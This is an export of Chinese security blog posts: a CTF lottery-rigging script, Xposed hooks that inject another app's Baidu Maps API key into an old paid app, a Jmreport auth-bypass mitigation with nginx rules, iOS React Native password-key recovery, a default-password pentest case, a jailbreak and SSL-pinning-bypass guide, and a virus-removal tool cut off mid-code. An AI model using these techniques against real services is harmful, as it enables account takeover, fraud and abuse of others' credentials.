{"pages":[{"title":"吾爱破解2025春节红包活动番外篇第三题","url":"/2025/02/12/52pj-web03-2025/","text":"0x00 前言番外篇第三题刚开始是有难度的，玩家会相互干扰，想要获取flag，还是需要靠一点运气的。后面修改了难度，分 IP 抽奖，互相不干扰了。难度就降低了不少。 0x01 分析第三题是抽奖的，地址：https://2025challenge.52pojie.cn/lottery.html ，看一下题目。 抽奖算法也给出了 12345blockNumber=$(curl -s -H 'Content-type: application/json' --data-raw '&#123;\"body\":&#123;&#125;&#125;' 'https://api.upowerchain.com/apis/v1alpha1/statistics/overview' | jq -r '.blockHeight')blockHash=$(curl -s -H 'Content-type: application/json' --data-raw '&#123;\"number\":\"'$blockNumber'\"&#125;' 'https://api.upowerchain.com/apis/v1alpha1/block/get' | jq -r '.data.blockHash')userCount=10001userIndex=$(python -c \"print($blockHash % $userCount)\")echo $userIndex 以之前中奖的为例，blockNumber=29443498，可以看到 blockHash=0xed10c6b62d163279cfff03e39a8017e303a03d48a6a314d24c47596b998ae30b 参与抽奖人数是10071 那么我们可以通过计算，获取中奖人的序号 123blockHash = 0xed10c6b62d163279cfff03e39a8017e303a03d48a6a314d24c47596b998ae30buserCount=10071print(blockHash % userCount) 验证结果是3000。 blockNumber在每次开奖前也给出了，那么可以根据blockNumber请求API获取blockHash。知道blockHash后，如果可以控制参与抽奖的人数，那么获奖人员的编号也能够确定了。 所以之前的难度是比较大的，都是真人玩家，不好确定参与人数和位置。后面降低了难度，分IP抽奖，互不干扰。 另外需要注意的是，每次抽奖系统会自动添加 9980 个机器人，所以如果参与抽奖的话，编号是从9980开始的。因此需要找到中奖序号大于等于9980的，才能保证自己中奖。而且满10000人才开奖，所以还要添加虚假的UID，来凑人数。 0x02 解题 由于现在答题地址下线，所以以之前已开奖的来模拟答题。找到一个中奖序号大于等于9980的blockNumber。 这里的blockNumber为29439513，假如参与抽奖的人数是10000-10300，主要代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647async function findWinningUserCount(blockNumber) &#123; try &#123; // 获取指定区块的哈希 const r = await fetch('https://api.upowerchain.com/apis/v1alpha1/block/get', &#123; method: 'POST', headers: &#123;'Content-Type': 'application/json'&#125;, body: JSON.stringify(&#123;\"number\": blockNumber.toString()&#125;) &#125;); const data = await r.json(); console.log(\"\\n=== API响应 ===\"); console.log(JSON.stringify(data, null, 2)); if (!data || !data.data || !data.data.blockHash) &#123; console.error(\"无效的API响应:\", data); return null; &#125; const hash = data.data.blockHash; const hashWithPrefix = hash.startsWith('0x') ? hash : '0x' + hash; console.log(`\\n区块哈希: $&#123;hashWithPrefix&#125;`); //从10000开始尝试不同的userCount for (let userCount = 10000; userCount &lt;= 10300; userCount++) &#123; const result = BigInt(hashWithPrefix) % BigInt(userCount); if(result &gt;= 9980n) &#123; const position = Number(result - 9980n); console.log(`\\n!!! FOUND WINNING COMBINATION !!!`); console.log(`Block: $&#123;blockNumber&#125;`); console.log(`Hash: $&#123;hashWithPrefix&#125;`); console.log(`User Count: $&#123;userCount&#125;`); console.log(`Absolute Position: $&#123;result&#125;`); console.log(`Relative Position: $&#123;position&#125;\\n`); return &#123;position, userCount&#125;; &#125; &#125; console.log(\"\\n没有找到合适的参与人数组合\"); return null; &#125; catch(e) &#123; console.error(`\\n[错误] 检查区块 $&#123;blockNumber&#125; 失败:`); console.error(\"错误详情:\", e); console.error(\"错误堆栈:\", e.stack); return null; &#125; &#125;const blockNumber = 29439513const result = await findWinningUserCount(blockNumber); 根据计算的结果，答题人需要有10201个，中奖的序号是10067，实际位置是第87。剩余的位置都添加虚假的UID。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748async function joinMultiple() &#123; let timestamp = Math.floor(Date.now() / 1000); let code = await getVerifyCode(timestamp.toString() + \"|\"); // 需要221个UID (10201 - 9980 = 221) const uids = []; // 生成221个UID，确保自己的UID在第87位 for(let i = 0; i &lt; 221; i++) &#123; if(i === 87) &#123; uids.push(\"你的UID\"); // 中奖位置 &#125; else &#123; uids.push((200000 + i).toString()); // 其他位置用虚假UID &#125; &#125; console.log(`\\n=== 开始提交抽奖请求 ===`); console.log(`时间戳: $&#123;timestamp&#125;`); console.log(`总UID数量: $&#123;uids.length&#125;`); console.log(`你的位置: 87\\n`); for(let uid of uids) &#123; try &#123; let response = await fetch('https://2025challenge.52pojie.cn/api/lottery/join', &#123; method: 'POST', headers: &#123;'Content-Type': 'application/json'&#125;, body: JSON.stringify(&#123; \"timestamp\": timestamp, \"uid\": uid, \"verify_code\": code &#125;) &#125;); const textResponse = await response.text(); try &#123; console.log(`UID $&#123;uid&#125;:`, JSON.parse(textResponse)); &#125; catch(e) &#123; console.log(`UID $&#123;uid&#125;:`, textResponse); &#125; await new Promise(r =&gt; setTimeout(r, 100)); // 添加延迟避免请求过快 &#125; catch(e) &#123; console.error(`Error submitting UID $&#123;uid&#125;:`, e.message); &#125; &#125; console.log(\"\\n=== 提交完成 ===\");&#125;joinMultiple(); 然后就等开奖即可。这里之所以和实际不一样，是因为参与人数不一样也会导致中奖的序号不一样的。 例如我们将参与人数变动一下，范围为10230-10300，得出的中奖序号是一样的。 0x03总结这道题的解题思路比较清晰：通过分析抽奖算法，发现中奖序号是由区块哈希值对参与总人数取模得到的。系统会自动添加 9980 个机器人账号，真实玩家的序号从 9980 开始。在后期分 IP 抽奖的调整下，不同 IP 之间互不干扰，这让解题变得更加可控。 解题步骤主要是：首先通过 API 获取指定区块的哈希值，然后遍历可能的参与总人数（比如 10000-10300），找到一个合适的总人数，使得计算出的中奖序号大于等于 9980。确定好参与总人数后，计算出自己需要在机器人之后的第几个位置（中奖序号减去 9980），然后将自己的 UID 放在这个位置，其他位置用虚假 UID 填充。最后等待开奖即可获得 flag。","tags":"52破解 ctf writeup"},{"title":"一次某APP的修复之旅","url":"/2025/01/15/fakelocatioin-fix-journey/","text":"0x00 前言最近发现某款APP无法正常使用，打开后地图页面是空白内容，无法显示和使用地图。经过排查，原来是开发者更新了百度地图的API Key，导致旧版本的APP无法正常访问地图服务。 0x01 问题分析APP启动后地图界面呈现空白状态，选择定位也是空白，确认位置提示“请点击地图选择位置”。 通过抓包，提示”APP Mcode码校验失败”。 说明该APP的百度地图APIKey与SHA1不匹配导致的，解决方法是替换为对应的APIKey和SHA1即可。 这里有几种解决方案，每种方法都有其优缺点，可以根据实际需求选择最适合的方式。解决方案： 1.反编译并替换APIKey（较为复杂，不推荐）： 步骤： 解压APK文件，找到AndroidManifest.xml文件中的com.baidu.lbsapi.API_KEY值，替换为正确的APIKey。然后重新打包并签名APK。 缺点： 该APP具有签名校验机制，重新打包后可能导致APP无法正常运行，且后续修改较为复杂。因此，此方法不推荐使用。 2.抓包软件拦截替换（简单）： 步骤： 使用抓包工具（如小黄鸟）拦截APP发出的网络请求，将请求中的ak参数（即APIKey）替换为新的APIKey。 优点： 实现简单，无需修改APP本身。 缺点： 每次使用APP时都需要开启抓包工具。 3.HOOK技术动态修改（较复杂，但使用最方便）： 步骤： 使用HOOK框架（如Xposed）动态修改APP中百度地图APIKey的获取逻辑，使其返回正确的APIKey。 优点： 一旦实现，后续使用无需额外操作，体验最为流畅。 0x02 过程无论是上面的哪种方案，都首需要获取正确的APIKey。APIKey可以自己申请，也可以查看新版本的APP中的APIKey是什么，然后进行替换。 自己申请的话，需要注册、认证百度地图开放平台 https://lbsyun.baidu.com/apiconsole/key ，然后创建一个Android应用。 选择一些所需的服务，需要有定位和地图SDK。 填写发布版SHA1和PackageName 发布版SHA1：0E:A9:54:9F:05:C4:35:4C:52:D2:53:48:9D:8A:21:15:25:CA:4A:13 PackageName：com.lerist.***tion （该应用的包名） 这里的SHA1是抓包的时候请求里面的，也可以手动计算。 123unzip Fxxxx1.3.5BETA_xxx.apk -d FKcd FK/META-INFkeytool -printcert -file FAKELOCA.RSA 用自己申请的APIKey进行测试。 发现是可以正常使用了。 如果不想自己申请SDK，也可以用新版本中的APIKey进行替换。 我们下载新版本进行查看 新版本的APIKey是 kGdfeSE3SeAUkeGtur7g8uIXbCx4alFN 。 同样测试一下新版本中的APIKey，也是可以正常使用的。 接下来用可以使用的APIKey进行替换，这里以新版本中的APIKey为例。 1.抓包替换这里采用的抓包工具是小黄鸟（需安装证书，否则无法抓包），打开小黄鸟，开启抓包，运行APP。 找到请求https://api.map.baidu.com/sdkcs/verify ，长按选择重写功能。 修改请求体，选择在线编辑或规则替换。 替换ak参数（即APIKey），修改为新的APIKey。 保存，可以看到重写器保存并激活成功。 重写运行app，发现地图功能已经可以正常使用了。 下次运行app时，打开抓包工具，运行抓包即可（重写器默认已经开启了）。 2.HOOK方法hook的话也有多种方法，比如可以直接HOOK ApplicationPackageManager的getApplicationInfo方法来修改。 主要代码： 12345678910111213141516171819XposedHelpers.findAndHookMethod( \"android.app.ApplicationPackageManager\", classLoader, \"getApplicationInfo\", String.class, int.class, new XC_MethodHook() &#123; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; ApplicationInfo appInfo = (ApplicationInfo) param.getResult(); if (appInfo != null &amp;&amp; appInfo.metaData != null) &#123; String originalKey = appInfo.metaData.getString(\"com.baidu.lbsapi.API_KEY\"); XposedBridge.log(\"原始百度地图 Key: \" + originalKey); // 修改 key appInfo.metaData.putString(\"com.baidu.lbsapi.API_KEY\", \"kGdfeSE3SeAUkeGtur7g8uIXbCx4alFN\"); &#125; &#125; &#125;); 也可以看一下百度地图SDK哪里使用了com.baidu.lbsapi.API_KEY，然后进行修改。对APP进行脱壳反编译并修复，打开dex文件。 1234root:~# grep -rnH --color=auto \"com.baidu.lbsapi.API_KEY\" *Binary file classes.dex matchesBinary file classes2.dex matchesroot:~# jadx-gui classes2.dex classes.dex 通过搜索，一共有3处用到了com.baidu.lbsapi.API_KEY。 其中有一处仅仅读取了，未进行进一步调用，因此可以忽略。 其余两处均有实际使用，针对这两处，我们可以通过HOOK修改返回值即可。 上面这个图是搜索的 BaiduLBS_Android.jar ，classes2.dex中的com.baidu.lbsapi.auth.LBSAuthManager 的 a方法使用jadx查看没有反编译完全。 主要代码： 1234567891011121314XposedHelpers.findAndHookMethod(\"com.baidu.lbsapi.auth.LBSAuthManager\", classLoader, \"getPublicKey\", \"android.content.Context\", new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) &#123; param.setResult(\"kGdfeSE3SeAUkeGtur7g8uIXbCx4alFN\"); &#125;&#125;);XposedHelpers.findAndHookMethod(\"com.baidu.lbsapi.auth.LBSAuthManager\", classLoader, \"a\", \"android.content.Context\", \"java.lang.String\", new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) &#123; param.setResult(\"kGdfeSE3SeAUkeGtur7g8uIXbCx4alFN\"); &#125;&#125;); 编译后并启用该模块，地图也可以正常使用。 0x03 总结之所以不用新版的APP，因为该软件是收费软件，而旧版本有激活的模块，所以选择在旧版本上进行修复。另外需要注意的是，该APP加壳，所以在写Xposed模块时需要找到壳的入口类，在这个类里面去获取context参数，然后就可以通过context获得到壳的类加载器，之后只需要用这个类加载器来hook即可。","tags":"fakelocation lsposed 定位"},{"title":"积木报表授权绕过漏洞缓解措施","url":"/2024/08/10/Jmreport-Auth-Bypass-Mitigation/","text":"0x00 前言近期，积木报表被曝出存在一个授权绕过漏洞。该漏洞允许攻击者在请求中包含特定参数时绕过授权机制，从而访问诸如 save、queryFieldBySql、show 等接口。尽管之前的远程代码执行（RCE）漏洞已被修复，但攻击者仍能通过 AviatorScript 表达式注入，继续实现 RCE 攻击。 目前，积木报表的最新版本为 1.7.9，但测试发现，该版本仍存在授权绕过的风险。漏洞修复的版本暂未发布。为此，本文将提供一种有效的缓解措施，以帮助用户降低该漏洞带来的安全风险。 0x01 漏洞复现至于漏洞分析这里就不进行了，有很多师傅已经发过详细的过程。这里使用的环境是jeecg-boot 3.7.0，积木报表版本为1.7.9。以接口 jmreport/save为例来判断漏洞是否存在。当没有previousPage和jmLink参数时，提示Token校验失败。增加previousPage和jmLink参数，且jmLink内容为类似 aaa||bbb 的base64 编码，可以保存成功，说明存在漏洞。 访问jmreport/queryFieldBySql接口，可以绕过授权进行查询。但无法利用CVE-2023-4450漏洞。 利用 jmreport/save 接口发送请求，写入构造好的AviatorScript表达式。 访问jmreport/show 接口时触发。从上面的结果来看，在授权绕过的情况下，仍然可以RCE。接下来就是如何防止漏洞被利用。 0x02 修复由于目前的最新版本依然存在漏洞，单纯升级并不能解决问题。如果应用系统不依赖积木报表，最简单直接的方法是删除积木报表。如果仍需使用该功能且不希望大幅修改代码，可以采取增加过滤器或使用 Nginx 代理等方式来防护。以下是使用 Nginx 反向代理进行防护的示例。根据漏洞的利用情况，可以设置当 URL 中同时包含参数 previousPage 和 jmLink 时，拦截请求并返回 403 错误。以官方的docker为例，修改 /etc/nginx/conf.d/default.conf文件，增加如下代码： 1234567891011121314# 初始化变量set $flag \"\";# 如果存在 jmLink 参数if ($request_uri ~* \"jmLink\") &#123; set $flag \"$&#123;flag&#125;A\";&#125;# 如果存在 previousPage 参数if ($request_uri ~* \"previousPage\") &#123; set $flag \"$&#123;flag&#125;B\";&#125;# 如果 flag 是 \"AB\"（即两个条件都满足），则返回 403if ( $flag = AB ) &#123; return 403;&#125; 配置完成后，重启Nginx。再次请求，返回403，说明配置生效。 然而，当参数采用 URL 编码时，可以绕过上述限制。 比较暴力的方法是当URL中含有% 时，返回403。 123if ($request_uri ~* %) &#123; return 403;&#125; 配置后重启Nginx，再次请求，成功拦截。 另外，当 Nginx 安装了 lua-nginx-module 模块时，可以采用如下配置： 123456789101112131415161718192021http &#123; lua_shared_dict my_cache 10m; server &#123; listen 80; location /jeecgboot &#123; access_by_lua_block &#123; local uri = ngx.unescape_uri(ngx.var.request_uri) if string.match(uri, \"jmLink\") and string.match(uri, \"previousPage\") then return ngx.exit(ngx.HTTP_FORBIDDEN) end &#125; ..... &#125; &#125;&#125; 通过以上配置，也可以有效防止漏洞被利用，进一步保障系统安全。 0x03 总结由于积木报表最新版本仍存在授权绕过漏洞，本文提供了一种简单的缓解措施。当然，防护的方法有很多种，例如直接使用 Web 应用防火墙（WAF）拦截恶意请求，或者在后端增加过滤器来加强安全性。通过这些措施，用户可以暂时降低系统受到攻击的风险，保障系统的稳定与安全。","tags":"jeecg-boot jmreport 漏洞修复"},{"title":"【IOS逆向】React Native案例","url":"/2023/11/23/ios-reverse-reactnative-case/","text":"0x00 前言一个用React Native构建的IOS应用案例，需要获取密码的加密算法。 0x01 过程登录抓包，发现密码被加密然后对APP进行砸壳 发现了文件main.jsbundle，这个通常是由 React Native框架生成的。React Native是一个流行的跨平台移动应用开发框架，它允许开发者使用JavaScript 和 React 来构建应用。使用 React Native 打包的应用，应用的一部分或全部界面和逻辑是用 JavaScript 实现的，而JavaScript 代码和资源会被打包成 main.jsbundle 文件。所以我们可以分析main.jsbundle 文件，将其重命名为js后缀，然后打开并格式化。 这里要寻找密码的加密方式，所以搜索password:，经过筛选后定位到下图代码主要代码 1234567891011var e = c.state, t = e.username, n = e.password, l = e.deviceId, o = (0, r(d[21]).uuid)(16),s = r(d[22]).SecurityTools.AES_createKey(), u = &#123; username: t, password: (0, r(d[23]).btoa)(o) + \".\" + (0, r(d[24]).encrypt)(n, o), rememberMe: !1, language: 'zhCN', requestFrom: 'app', _KEY_: s, ClientFlag: 'PWdCipher', deviceId: l&#125;; password的话由两部分组成，然后用”.”拼接了起来。js中(0,函数名)(参数)就相当于函数的调用，如 所以password这里可以看作为 1r(d[23]).btoa(o) + \".\" + r(d[24]).encrypt(n, o) o是由(0, r(d[21]).uuid)(16)获取的，uuid 通常是一个用于生成唯一标识符（UUID）的函数。在这里可能是用来生成一个特定长度为16位的UUID。btoa 是一个内置的 JavaScript 函数，通常用于Base64 编码。在这里，r(d[23]).btoa可能是对 btoa 函数的引用。因此判断前半部分的话应该是对o进行了base64编码。根据抓包的结果，password前半部分为V2FQRTlMbU5PejBwc0VsSw==，对其进行base64解码，结果为WaPE9LmNOz0psElK，刚好是16位长度。这里的o对应的内容为WaPE9LmNOz0psElK 。后半部分采用了encrypt加密，有2个参数n和o，n为输入的密码（测试的时候输入的是1），当前情况下o为WaPE9LmNOz0psElK 。我们搜索encrypt = function \\(\\w+, \\w+\\)只有一个结果采用了AES-CBC加密，参数f为输入的密码，c为16位的随机数（当前情况下c为WaPE9LmNOz0psElK）接下来就是确定n.default.secretKey的值了。这个应用比较简单，直接查找使用就能找到值。成功解密。 这是比较顺利的情况，可以直接找到secretKey。如果无法直接找到的话，可以通过插桩的方法来输出secretKey的值。将修改后的文件与main.jsbundle替换，然后重新打包ipa文件，也可以通过直接ssh连接到手机，直接替换main.jsbundle。第一种方法比较麻烦一点，一般都采用第二种。ssh连接手机，执行命令find / -name &quot;main.jsbundle&quot;来搜索main.jsbundle文件。红框中打码的内容为xxxx_app，与ipa解压payload中的一样，所以是这个。然后通过scp将本地修改好的文件上传到手机上，替换main.jsbundle，重新运行app即可。插桩的方法也有多种，如可以使用console.log或者alert输出。运行效果 也可以设置一个全局变量（tempSecretKey），然后将secretKey的值赋给全局变量，然后放在数据包请求中。 运行APP后，进行抓包也是可以成功获取secretKey的。 0x02 总结对于React Native打包的APP，主要是分析main.jsbundle文件。通过插桩的方式来辅助分析，修改后替换手机上的文件。另外使用 HBuilder 开发的项目，做法类似，主要是分析和替换app-service.js文件 。","tags":"ios逆向 react-native"},{"title":"【渗透案例】消失的登录页面","url":"/2023/11/08/vanished-login-page/","text":"0x00前言在某次测试过程中，遇到了这样一个网站，存在登录页面但却无法直接通过地址栏访问login页面。在 JS 文件中发现了默认密码，同时找到了登录接口，然而密码进行了加密。通过分析JS文件，最终通过两种方式来实现了登录，一种是找到密码的加密方法，一种是让登录接口”重见天日”。 0x01过程网站主页都是一些展示的内容，js文件是通过webpack打包的，格式化后大概三十多万行。通过js文件发现了一些接口，其中有些接口存在未授权访问漏洞。而且有一个接口可以查看上传的所有附件信息，其中还包含了用户名。 通过分析JS文件，发现存在默认密码 而且也找到了登录的接口，一共两个，一个是Login，一个是LoginApp，其中LoginApp不需要验证码。 目前有登录的接口、一部分用户名（从未授权中获取的），还有系统的默认密码，接下来就是测试那些用户使用了默认密码，可以成功登录。但是从登录接口发现，登录过程中密码采用了_encrypt函数进行加密。大概如下： 123t.prototype._encrypt = function(t) &#123; return D(y.Md5.hashStr(t.toString()).toString())&#125; 可以猜测首先对密码进行了Md5加密后，又经过了D函数进行加密。接下来可以寻找D函数是如何进行加密的。一般情况下，D函数有如下两种定义的方法： 1234567function D(params)&#123; ...&#125;D = function(params)&#123; ...&#125; 然后我们可以通过下面的两种正则进行搜索。 12D &#x3D; function\\(\\w\\)function D\\(\\w\\) 幸好D函数不多，也没有混淆，经过确认D函数是SHA1加密。而且经过验证，成功找到了几个可以登录的账号。 登录后，某个接口可以列举所有的用户，包括该用户加密后的密码。 例如登录admin用户。 回过头来继续看登录页面，直接浏览器访问https://test.com/login 时，会重定向到主页。 通过搜索js文件 发现了n.router.navigateByUrl(&quot;/login&quot;)，这是一个用于在前端Web应用中进行路由导航的代码片段。它通常在前端框架或库（如Angular、Vue.js、React等）中使用，用于导航到指定的路由或页面。 当执行它时，应用程序会导航到 /login 路由或页面。 因此我们导航加载的位置，然后执行router.navigateByUrl(&quot;/login&quot;)，这里是this.navigateByUrl(&quot;/login&quot;)成功的跳转到了登录的页面 通过验证，Login接口密码也是经过了md5后再进行SHA1加密。 0x02总结这个网站虽然存在登录页面，但无法直接通过URL访问。通过分析JS代码发现了默认密码，了解了密码加密方式。通过API接口，找到了未授权访问漏洞，获取了用户名，实现了登录。另外通过分析js，可以使用router.navigateByUrl(&quot;/login&quot;)来导航到登录页面，从而让登录页面出现，然后通过登录页面来登录。","tags":"js逆向 路由"},{"title":"【IOS逆向】越狱环境搭建","url":"/2023/03/07/IOS-Jailbreak-Environment/","text":"0x00前言由于之前用的手机是IPhone6s，版本是12.4，有一些APP打开会直接闪退，于是换了一部6sp，版本是14.6。对其进行越狱，安装一些所需要的插件，并记录一下过程。 0x01 使用checkra1n越狱一般常用的是unc0ver或者checkra1n进行越狱，前者的稍微简单一点，后者稍微复杂一些。这里本打算直接使用unc0ver进行越狱，结果安装后提示不支持。 于是这里使用checkra1n进行越狱。 打开checkra1n虽然提示不支持14.6，这里Start按钮是灰色的。选择Options勾选前两项。然后点击Back返回。此时Start按钮就可以使用了。 手机进入恢复模式根据提示进行越狱 点Start按钮 然后一起按着关机键和Home键倒计时结束松开关机键，仍然按着Home键。然后等待即可 等手机重启后就进入了越狱模式。 非完美越狱，重启后仍需重新越狱。 使用checkra1n越狱后，需要手动安装cydia，之后才可以进行插件的安装。 0x02 插件安装 安装cydiaCydia是一款用于iOS设备（如iPhone和iPad）的第三方应用商店，允许用户下载、安装和管理未经授权的应用程序、扩展和主题。在checkra1n中安装cydia 网络问题可以挂上科学。 安装ssh打开Cydia应用商店，搜索openssh，然后安装即可。 安装后可以使用ssh进行访问，默认密码alpine 可以使用iproxy 2222 22将手机的22端口转发到2222端口。 安装FlyJB X 屏蔽越狱检测插件添加雷锋软件源http://apt.abcydia.com，搜索FlyJB 安装frida添加源https://build.frida.re/,然后搜索frida安装其它版本的frida可以从github下载所需的frida安装包，然后通过命令安装。例如安装15.1.17版本的Frida。下载deb文件https://github.com/frida/frida/releases?page=3 123scp -P2225 frida_15.1.17_iphoneos-arm.deb root@localhost:/tmpdpkg -i frida_15.1.17_iphoneos-arm.debkillall -HUP SpringBoard 安装SSLKillSwitchSSLKillSwitch是ios中常用解除SSL pining的插件。https://github.com/nabla-c0d3/ssl-kill-switch2 1234wget https://github.com/nabla-c0d3/ssl-kill-switch2/releases/download/0.14/com.nablac0d3.sslkillswitch2_0.14.debscp -P 2224 com.nablac0d3.sslkillswitch2_0.14.deb root@localhost:/tmpdpkg -i com.nablac0d3.sslkillswitch2_0.14.debkillall -HUP SpringBoard 安装时需要确保Cydia已经安装了下列软件：Debian PackagerCydia SubstratePreferenceLoader 也可以直接添加源https://julioverne.github.io/，从上面安装（我使用这个APP直接闪退） 如果在设置中看不到SSL Kill Switch2，可以尝试重新安装PreferenceLoader、Cydia Substrate 巨魔商店巨魔商店（TrollStore） 是一个永久可以安装未签名IPA应用程序，适用于iiOS 14.0 - 15.5b4, 15.6b1 - 15.6b5。添加源https://havoc.app/，搜索安装TrollStore Helper，然后安装TrollStore。更多请参考：https://github.com/opa334/TrollStore/blob/main/install_trollhelper.md 其它插件可以安装Filza、Terminal等，前者是文件管理，后者是手机上的终端工具。Filza Terminal 0x03 注意事项 在越狱过程中，一定要注意选择适合您设备的越狱工具和操作系统版本。如果选择错误，可能会导致设备无法使用或出现其他问题。 越狱可能会使您的设备更加脆弱和不稳定，因此请谨慎考虑是否需要越狱。一些越狱应用和插件可能会导致设备出现问题或无法启动，甚至可能会损坏设备。 在越狱后，一定要注意安装和使用可信的越狱应用和插件，以避免安全问题和系统崩溃等问题。一些未经官方认证的应用和插件可能包含恶意代码或病毒，会对设备造成损害。","tags":"ios越狱 checkra1n越狱 越狱插件"},{"title":"如何从零写一个病毒专杀工具","url":"/2022/10/28/Ground-Virus-Kill/","text":"0x00 前言最近有这样一个需求，需要对某病毒写一个专杀工具，针对这款病毒进行查杀。这个病毒样本是今年2月份发现的，该病毒相对来说比较友好，没有采用加密，也没有删除原文件，也没有网络传播行为。只是会感染可执行文件，会将原文件修改名字，生成一个与原文件同名的感染文件，运行后可继续感染其他文件。接下来首先从非专业的角度来简单看一下该病毒是如何运行的。 0x01 病毒分析运行病毒文件，一旦找到可感染的可执行文件，病毒会将其复制为 g&lt;原始文件名&gt;.exe，并将其隐藏。然后用原程序的名称和图标复制自己；如果原文件的资源中不存在该图标，病毒将使用自己的图标，并留下一个0大小的文件g&lt;原始文件名&gt;.ico。生成的文件大小为522k左右。 如上图，python.exe感染后会生成gpython.exe（原始程序）并隐藏，此时python.exe（感染程序）相当于一个加载器，运行时会执行病毒程序同时运行gpython.exe。 如果文件夹中文件exe文件是g开头，则不感染。 当点击替换后的可执行文件后，病毒会启动恶意主程序ground.exe，感染其他可执行文件，并设置开机启动项。 启动项 通过非专业的角度对病毒文件的运行进行了简单的分析，病毒查杀的话就是全盘或指定路径扫描可执行文件，根据病毒文件的特征码来判断该文件是否是病毒文件，如果是则进行删除，然后将原文件进行恢复。大致流程如下图： 0x02 代码编写根据上面的流程图，查杀代码可以分为三部分：1.实现可执行文件的扫描功能；2.实现病毒特征识别功能；3.删除病毒，恢复原文件。语言采用了C++，面向必（C）应（V）编程。 1.文件扫描实现其实就是递归遍历目录下的所有可执行文件，这里实现的方式有多种。例如可以采用filesystem（C++17以上）、io.h、winApi等。这里采用的是winApi。 主要代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;string&gt;#include &lt;Windows.h&gt;using namespace std;#include &lt;vector&gt;vector&lt;string&gt; result;bool search(const char* path = \"C:\\\\\", char* file = \"exe\") &#123; HANDLE hFile; char buffer[MAX_PATH] = &#123; 0, &#125;; WIN32_FIND_DATA pNextInfo; //搜索得到的文件信息将储存在pNextInfo中; sprintf_s(buffer, \"%s\\\\*.*\", path); hFile = FindFirstFile(buffer, &amp;pNextInfo);//请注意是 &amp;pNextInfo , 不是 pNextInfo; if (!hFile) &#123; return false; &#125; string t; //cout &lt;&lt; buffer &lt;&lt; endl; while (FindNextFile(hFile, &amp;pNextInfo)) &#123; if (pNextInfo.cFileName[0] == '.')//过滤.和.. continue; //cout &lt;&lt; pNextInfo.cFileName &lt;&lt; endl; if (pNextInfo.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) &#123; ZeroMemory(buffer, MAX_PATH); sprintf_s(buffer, \"%s\\\\%s\", path, pNextInfo.cFileName); //cout &lt;&lt; buffer &lt;&lt; endl; search(buffer, file); &#125; t.assign(path); t += '\\\\'; t.append(pNextInfo.cFileName); int len = strlen(file); if (t.substr(t.size() - len) == file) &#123; result.push_back(t);//对t对象进行深复制 &#125; &#125; return true; &#125;int main() &#123; search(\"E:\\\\\"); printf(\"%d\", result.size());&#125; 主要就是递归搜索所有exe后缀的文件，然后存在vector中。 2.病毒特征码提取特征码可能是病毒的感染标记，也可能是若干计算机指令组成的一段计算机程序。特征码的提取方式有多种，例如该病毒中存在字符串Groud，可以以此作为特征码。 搜索字符串Ground，有多处存在，挑选一处。如上图所示，如果位置0x59B53-0x59B59为47 72 6F 75 6E 64则认为该文件为病毒文件。这是根据字符串特征来搜索的，可能会不太准确，也可以采用病毒查杀的方式来定位特征码。可以使用工具MYCCL3.0或者VirTest5.0。这里使用的是VirTest5.0。 根据工具的使用说明来制作测试文件和载入测试文件。 接下来就是定位特征了，这里杀软使用了某绒。 最终定位到了偏移0x290-0x294，内容为046AF6EB。我们来验证一下。将偏移0x290-0x294的数据nop后，针对该文件以及该文件感染的文件，用该huorong杀毒扫描，提示无风险。 而且执行感染的文件，杀软也不会对其进行拦截。 当然可能由于这里是虚拟机，所以部分杀软某些功能未启动而导致。 有特征码了，就可以根据该特征码来判断文件是否是病毒文件，当然为了以防万一，可以采用进行多个特征码来进行判断。主要代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// 扫描特征码，对比bool GetPeSignature(LPCSTR FilePath)&#123; boolean flag = false; int count = 0; typedef struct _SIGN &#123; char FileName[64]; // 存储文件名或特征描述 LONG FileOffset; // 存储检测文件偏移地址 BYTE VirusSign[4 + 1]; // 存储特征码大小4,其中的1是结束符. &#125;SIGN, *pSIGN; // 定义特征码与特征描述信息 SIGN Sign[] = &#123; &#123; \"HuoRong\", 0x2970, \"\\x04\\x6a\\xf6\\xeb\" &#125;, &#123; \"360_1\", 0x61c6b, \"\\x8B\\x75\\xF0\\x8B\" &#125;, &#123; \"360_2\", 0x738E5, \"\\xC4\\x07\\x00\\xBC\" &#125; &#125;; DWORD dwNum = 0; BYTE buffer[4 + 1]; HANDLE hFile = NULL; // 获取到FilePath路径下文件的句柄信息 hFile = CreateFile(FilePath, GENERIC_READ , NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); /*DWORD error = GetLastError(); cout &lt;&lt; hFile &lt;&lt; error &lt;&lt; endl;*/ for (int x = 0; x &lt; (sizeof(Sign) / sizeof(Sign[0])); x++) &#123; // 将待检测程序的文件指针指向特征码的偏移位置 SetFilePointer(hFile, Sign[x].FileOffset, NULL, FILE_BEGIN); // 读取目标程序指定位置的特征码到内存中 ReadFile(hFile, buffer, sizeof(buffer), &amp;dwNum, NULL); // 对比内存中两个特征码是否相等 if (memcmp(Sign[x].VirusSign, buffer, 4) == 0) &#123; count++; //printf(\"匹配特征: %s \\n\", Sign[x].FileName); &#125; &#125; if (count == sizeof(Sign) / sizeof(Sign[0])) &#123; flag = true; &#125; CloseHandle(hFile); return flag;&#125; 3.删除病毒，恢复原文件接下来就是删除病毒和恢复文件了，可以直接使用remove()来删除文件，但是为了防止删错文件，因此这里将文件删除到了回收站。 12345678910111213141516171819202122232425262728BOOL delFiletoRecycle(LPCTSTR pszPath, BOOL bDelete/*=FALSE*/)&#123; SHFILEOPSTRUCT shDelFile; memset(&amp;shDelFile, 0, sizeof(SHFILEOPSTRUCT)); shDelFile.fFlags |= FOF_SILENT; // don't report progress shDelFile.fFlags |= FOF_NOERRORUI; // don't report errors shDelFile.fFlags |= FOF_NOCONFIRMATION; // don't confirm delete TCHAR buf[_MAX_PATH + 1]; // allow one more character strcpy_s(buf, pszPath); // copy caller's pathname buf[strlen(buf) + 1] = 0; // need two NULLs at end // Set SHFILEOPSTRUCT params for delete operation shDelFile.wFunc = FO_DELETE; // REQUIRED: delete operation shDelFile.pFrom = buf; // REQUIRED: which file(s) shDelFile.pTo = 